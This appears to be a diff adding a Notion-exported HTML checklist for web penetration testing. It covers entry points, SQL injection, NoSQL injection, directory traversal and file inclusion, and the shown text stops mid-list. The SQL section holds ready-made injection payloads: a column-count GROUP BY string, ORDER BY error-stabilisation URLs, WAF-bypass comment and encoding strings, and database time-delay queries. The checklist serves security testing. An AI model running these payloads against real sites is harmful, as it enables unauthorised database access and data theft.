@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+<html>
+<style>
+/* Remove default bullets */
+ul, #myUL {
+  list-style-type: none;
+}
+
+/* Remove margins and padding from the parent ul */
+#myUL {
+  margin: 0;
+  padding: 0;
+}
+
+/* Style the caret/arrow */
+.caret {
+  cursor: pointer;
+  user-select: none; /* Prevent text selection */
+}
+
+/* Create the caret/arrow with a unicode, and style it */
+.caret::before {
+  content: "\25B6";
+  color: black;
+  display: inline-block;
+  margin-right: 6px;
+}
+
+/* Rotate the caret/arrow icon when clicked on (using JavaScript) */
+.caret-down::before {
+  transform: rotate(90deg);
+}
+
+/* Hide the nested list */
+.nested {
+  display: none;
+}
+
+/* Show the nested list when the user clicks on the caret/arrow (with JavaScript) */
+.active {
+  display: block;
+}
+
+/* When clicked on, add a background color and strike out text */
+ul li.checked {
+  background: #888;
+  color: #fff;
+  text-decoration: line-through;
+}
+</style>
+<body>
+
+<ul id="myUL">
+  <li><span class="caret">Application Entry Points</span>
+    <ul class="nested">
+      <li><input type="checkbox">  Register</li>
+      <li><input type="checkbox">  Login</li>
+      <li><input type="checkbox">  Upload Functionality</li>
+      <li><input type="checkbox">  Search Box</li>
+      <li><input type="checkbox">  Comment & Feedback Section</li>
+      <li><input type="checkbox">  Contact Us Form</li>
+      <li><input type="checkbox">  GET & POST Request</li>
+      <li><input type="checkbox">  Cookies and Import Functions</li>
+      <li>Reference: </li>
+      <div style="display: flex;"><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points" target="_blank" rel="noopener noreferrer" style="display: flex; color: inherit; text-decoration: none; user-select: none; transition: background 20ms ease-in 0s; cursor: pointer; flex-grow: 1; min-width: 0px; flex-wrap: wrap-reverse; align-items: stretch; text-align: left; overflow: hidden; border: 1px solid rgba(55, 53, 47, 0.16); border-radius: 4px; position: relative; fill: inherit;"><div style="flex: 4 1 180px; padding: 12px 14px 14px; overflow: hidden; text-align: left;"><div style="font-size: 14px; line-height: 20px; color: rgb(55, 53, 47); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; min-height: 24px; margin-bottom: 2px;">WSTG - Latest | OWASP Foundation</div><div style="font-size: 12px; line-height: 16px; color: rgba(55, 53, 47, 0.65); height: 32px; overflow: hidden;">WSTG - Latest on the main website for The OWASP Foundation. OWASP is a nonprofit foundation that works to improve the security of software.</div><div style="display: flex; margin-top: 6px;"><img src="/image/https%3A%2F%2Fowasp.org%2Fwww--site-theme%2Ffavicon.ico?table=block&amp;id=f4a7b90f-a3fd-4766-96d2-28c5a3ef753a&amp;spaceId=078aa5d5-c7f7-4467-a026-7dcc1e7ab45e&amp;userId=&amp;cache=v2" style="width: 16px; height: 16px; min-width: 16px; margin-right: 6px;"><div style="font-size: 12px; line-height: 16px; color: rgb(55, 53, 47); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points</div></div></div><div style="flex: 1 1 180px; display: block; position: relative;"><div style="position: absolute; inset: 0px;"><div style="width: 100%; height: 100%;"><img src="/image/https%3A%2F%2Fowasp.org%2Fwww--site-theme%2Ffavicon.ico?table=block&amp;id=f4a7b90f-a3fd-4766-96d2-28c5a3ef753a&amp;spaceId=078aa5d5-c7f7-4467-a026-7dcc1e7ab45e&amp;userId=&amp;cache=v2" referrerpolicy="same-origin" style="display: block; object-fit: cover; border-radius: 1px; width: 100%; height: 100%;"></div></div></div></a><div style="position: relative; left: 0px;"></div></div>
+    </ul>
+  </li>
+
+<li><span class="caret">SQL Injection</span>
+    <ul class="nested">
+      <div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;"><span class="" data-token-index="0">Find injection point
+Understand the website behaviour
+Send queries </span><span class="token keyword" data-token-index="0">for</span><span class="" data-token-index="0"> enumeration
+Understanding </span><span class="token constant" data-token-index="0">WAF</span><span class="" data-token-index="0"> </span><span class="token operator" data-token-index="0">&amp;</span><span class="" data-token-index="0"> bypass it
+Dump the database</span><span>
+</span></div></div></div>
+
+      <li><input type="checkbox">  Error based</li>
+      <li><input type="checkbox">  Union based</li>
+      <li><input type="checkbox">  Blind based</li>
+      <li><input type="checkbox">  Use Routed queries (for WAF Bypass)</li>
+       <li><span class="caret">Bypass Error: The used SELECT statements have a different number of columns</span>
+        <ul class="nested">
+        <div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;"><span class="" data-token-index="0">The given query will find how many columns the database has</span><span class="token operator" data-token-index="0">:</span><span class="" data-token-index="0">
+
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">domain</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">br</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">id</span><span class="token operator" data-token-index="0">=</span><span class="token number" data-token-index="0">1</span><span class="" data-token-index="0">' </span><span class="token constant" data-token-index="0">GROUP</span><span class="" data-token-index="0"> </span><span class="token constant" data-token-index="0">BY</span><span class="" data-token-index="0"> </span><span class="token number" data-token-index="0">1</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">2</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">3</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">4</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">5</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">6</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">7</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">8</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">9</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">10</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">11</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">12</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">13</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">14</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">15</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">16</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">17</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">18</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">19</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">20</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">21</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">22</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">23</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">24</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">25</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">26</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">27</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">28</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">29</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">30</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">31</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">32</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">33</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">34</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">35</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">36</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">37</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">38</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">39</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">40</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">41</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">42</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">43</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">44</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">45</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">46</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">47</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">48</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">49</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">50</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">51</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">52</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">53</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">54</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">55</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">56</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">57</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">58</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">59</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">60</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">61</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">62</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">63</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">64</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">65</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">66</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">67</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">68</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">69</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">70</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">71</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">72</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">73</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">74</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">75</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">76</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">77</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">78</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">79</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">80</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">81</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">82</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">83</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">84</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">85</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">86</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">87</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">88</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">89</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">90</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">91</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">92</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">93</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">94</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">95</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">96</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">97</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">98</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">99</span><span class="token punctuation" data-token-index="0">,</span><span class="token number" data-token-index="0">100</span><span class="token operator" data-token-index="0">--</span><span class="" data-token-index="0"> </span><span class="token operator" data-token-index="0">-</span><span>
+</span></div></div></div>
+          </ul>
+       <li><span class="caret">Bypassing WAF</span>
+        <ul class="nested">
+          <li><input type="checkbox">  Using Null byte before SQL query</li>
+          <li><input type="checkbox">  Using SQL inline comment sequence</li>
+          <li><input type="checkbox">  URL encoding</li>
+          <li><input type="checkbox">  Changing Cases (uppercase/lowercase)</li>
+          <li><input type="checkbox">  Use SQLMAP tamper scripts</li>
+          </ul>
+       <li><span class="caret">Stabilise & Whitespace Filter Bypass</span>
+        <ul class="nested">
+        <li><span class="caret">Stabilise the error message</span>
+            <ul class="nested">
+              <div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;"><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">domain</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">id</span><span class="token operator" data-token-index="0">=</span><span class="token number" data-token-index="0">1</span><span class="" data-token-index="0">' order by </span><span class="token number" data-token-index="0">1</span><span class="token punctuation" data-token-index="0">)</span><span class="token operator" data-token-index="0">--</span><span class="" data-token-index="0">
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">domain</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">id</span><span class="token operator" data-token-index="0">=</span><span class="token number" data-token-index="0">1</span><span class="" data-token-index="0">' order by </span><span class="token number" data-token-index="0">1</span><span class="token punctuation" data-token-index="0">)</span><span class="token punctuation" data-token-index="0">)</span><span class="token operator" data-token-index="0">--</span><span class="" data-token-index="0">
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">domain</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">id</span><span class="token operator" data-token-index="0">=</span><span class="token number" data-token-index="0">1</span><span class="" data-token-index="0">' order by </span><span class="token number" data-token-index="0">1</span><span class="token punctuation" data-token-index="0">;</span><span class="token operator" data-token-index="0">%</span><span class="token number" data-token-index="0">00</span><span class="" data-token-index="0">
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">domain</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">id</span><span class="token operator" data-token-index="0">=</span><span class="token number" data-token-index="0">1</span><span class="" data-token-index="0">' order by </span><span class="token number" data-token-index="0">1</span><span class="token punctuation" data-token-index="0">)</span><span class="token punctuation" data-token-index="0">)</span><span class="token punctuation" data-token-index="0">;</span><span class="token operator" data-token-index="0">%</span><span class="token number" data-token-index="0">00</span><span class="" data-token-index="0">
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">domain</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">id</span><span class="token operator" data-token-index="0">=</span><span class="token number" data-token-index="0">1</span><span class="" data-token-index="0">' order by </span><span class="token number" data-token-index="0">1</span><span class="token punctuation" data-token-index="0">;</span><span class="token operator" data-token-index="0">%</span><span class="token number" data-token-index="0">60</span><span class="" data-token-index="0">
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">domain</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">id</span><span class="token operator" data-token-index="0">=</span><span class="token number" data-token-index="0">1</span><span class="" data-token-index="0">' order by </span><span class="token number" data-token-index="0">1</span><span class="token operator" data-token-index="0">%</span><span class="token number" data-token-index="0">23</span><span class="" data-token-index="0">
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">domain</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">id</span><span class="token operator" data-token-index="0">=</span><span class="token number" data-token-index="0">1</span><span class="" data-token-index="0">' order by </span><span class="token number" data-token-index="0">1</span><span class="token operator" data-token-index="0">%</span><span class="token number" data-token-index="0">60</span><span class="" data-token-index="0">
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">domain</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">id</span><span class="token operator" data-token-index="0">=</span><span class="token number" data-token-index="0">1</span><span class="" data-token-index="0">' order by </span><span class="token number" data-token-index="0">1</span><span class="token operator" data-token-index="0">%</span><span class="token number" data-token-index="0">90</span><span class="" data-token-index="0">
+</span><span class="token literal-property property" data-token-index="0">http</span><span class="token operator" data-token-index="0">:</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">domain</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">com</span><span class="token operator" data-token-index="0">/</span><span class="" data-token-index="0">index</span><span class="token punctuation" data-token-index="0">.</span><span class="" data-token-index="0">php</span><span class="token operator" data-token-index="0">?</span><span class="" data-token-index="0">id</span><span class="token operator" data-token-index="0">=</span><span class="token number" data-token-index="0">1</span><span class="" data-token-index="0">'</span><span class="token operator" data-token-index="0">%</span><span class="token number" data-token-index="0">23</span><span class="token comment" data-token-index="0">/* order by 1
+http://domain.com/index.php?id=1') order by 1
+http://domain.com/index.php?id=1' order by 1") ;%00
+http://domain.com/index.php?id=1' order by 1#--+
+http://domain.com/index.php?id=1' order by 1'))%23</span><span>
+</span></div></div></div>
+            </ul>
+       <li><span class="caret">Whitespace WAF-based bypass</span>
+            <ul class="nested">
+              <div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;"><span class="token comment" data-token-index="0">/**/</span><span class="" data-token-index="0">
+</span><span class="token comment" data-token-index="0">/**_**/</span><span class="" data-token-index="0">
+</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">23nuLL</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">0A
+</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">23qa</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">0A</span><span class="token operator" data-token-index="0">%</span><span class="token number" data-token-index="0">23</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">0A
+</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">23foo</span><span class="token operator" data-token-index="0">*</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">2F</span><span class="token operator" data-token-index="0">*</span><span class="" data-token-index="0">bar</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">0D</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">0A
+</span><span class="token operator" data-token-index="0">+</span><span>
+</span></div></div></div>
+            </ul>
+       <li><span class="caret">WAF blocks retrieving information from database()</span>
+            <ul class="nested">
+              <div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;"><span class="" data-token-index="0">Simply replace </span><span class="token function" data-token-index="0">database</span><span class="token punctuation" data-token-index="0">(</span><span class="token punctuation" data-token-index="0">)</span><span class="" data-token-index="0"> </span><span class="token keyword" data-token-index="0">with</span><span class="" data-token-index="0"> one </span><span class="token keyword" data-token-index="0">of</span><span class="" data-token-index="0"> the following payload</span><span class="token operator" data-token-index="0">:</span><span class="" data-token-index="0">
+database</span><span class="token comment" data-token-index="0">/*badd*/</span><span class="token operator" data-token-index="0">/</span><span class="token operator" data-token-index="0">**</span><span class="token operator" data-token-index="0">/</span><span class="token punctuation" data-token-index="0">(</span><span class="token punctuation" data-token-index="0">)</span><span class="" data-token-index="0">
+database</span><span class="token operator" data-token-index="0">%</span><span class="token number" data-token-index="0">23</span><span class="token operator" data-token-index="0">%</span><span class="token number" data-token-index="0">0</span><span class="token function" data-token-index="0">A</span><span class="token punctuation" data-token-index="0">(</span><span class="token operator" data-token-index="0">%</span><span class="token number" data-token-index="0">23</span><span class="token operator" data-token-index="0">%</span><span class="" data-token-index="0">0A</span><span class="token punctuation" data-token-index="0">)</span><span>
+</span></div></div></div>
+            </ul>     
+        </ul>
+      <li><span class="caret">Time Delays</span>
+        <ul class="nested">
+          <div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;"><span class="" data-token-index="0">      Oracle 	      dbms_pipe.receive_message(('a'),10)
+      
+      Microsoft 	  WAITFOR DELAY '0:0:10'
+      
+      PostgreSQL 	  SELECT pg_sleep(10)
+      
+      MySQL 	      SELECT sleep(10)</span><span>
+</span></div></div></div>
+          </ul>
+          <li><span class="caret">Conditional Delays</span>
+        <ul class="nested">
+<div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;"><span class="" data-token-index="0">      Oracle 	      SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+      
+      Microsoft 	  IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+      
+      PostgreSQL 	  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+      
+      MySQL 	      SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')</span><span>
+</span></div></div></div>        </ul>
+          
+      </ul>
+  </li>
+   <li><span class="caret">NoSQL Injection</span>
+    <ul class="nested">
+      <li><input type="checkbox">  Error based - Detecting syntax injection in MongoDB</li>
+      <li><input type="checkbox">  Boolean Blind injection - inject parameters with true/false payloads and attempt to determine if an injection exists</li>
+      <li><input type="checkbox">  Timing injection - attempt to inject timing delays in the server, to measure the response</li>
+      <div style="color: inherit; fill: inherit;"><div style="display: flex;"><div spellcheck="true" placeholder=" " data-content-editable-leaf="true" style="max-width: 100%; width: 100%; white-space: pre-wrap; word-break: break-word; caret-color: rgb(55, 53, 47); padding: 3px 2px;" contenteditable="false"><a href="https://github.com/matrix/Burp-NoSQLiScanner" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:inherit" class="notion-external-object-token notion-text-mention-token notion-focusable-token notion-enable-hover" data-token-index="0" contenteditable="false" tabindex="0"><img style="width:1em;height:1em;vertical-align:-0.15em;border-radius:4px;margin-right:0.3em" src="/images/external_integrations/github-icon.png"><span style="border-bottom:0.05em solid rgba(55,53,47,.25);font-weight:500;flex-shrink:0">Burp-NoSQLiScanner</span><span></span></a>​</div><div style="position: relative; left: 0px;"></div></div></div>
+      </ul>
+      <li><span class="caret">Directory Traversal Attacks</span>
+    <ul class="nested">
+      <li><input type="checkbox"> 16 bits Unicode encoding</li>
+      <li><input type="checkbox"> UTF-8 Unicode encoding </li>
+      <li><input type="checkbox"> Double URL encoding</li>
+      <li><input type="checkbox"> Bypass "../" replaced by "" </li>
+      <li><input type="checkbox"> Bypass "../" with ";" </li>
+      <li><input type="checkbox"> UNC Bypass</li>
+      <li><input type="checkbox"> NGINX/ALB Bypass</li>
+      <li><input type="checkbox"> ASPNET Cookieless Bypass</li>
+      </ul>
+      <li><span class="caret">File Inclusion</span>
+    <ul class="nested">
+      <li><span class="caret">Local File Inclusion</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Null byte </li>
+          <li><input type="checkbox"> Double encoding</li>
+          <li><input type="checkbox"> UTF-8 encoding</li>
+          <li><input type="checkbox"> Path and dot truncation</li>
+          <li><span class="caret">Filter bypass tricks</span>
+            <ul class="nested">
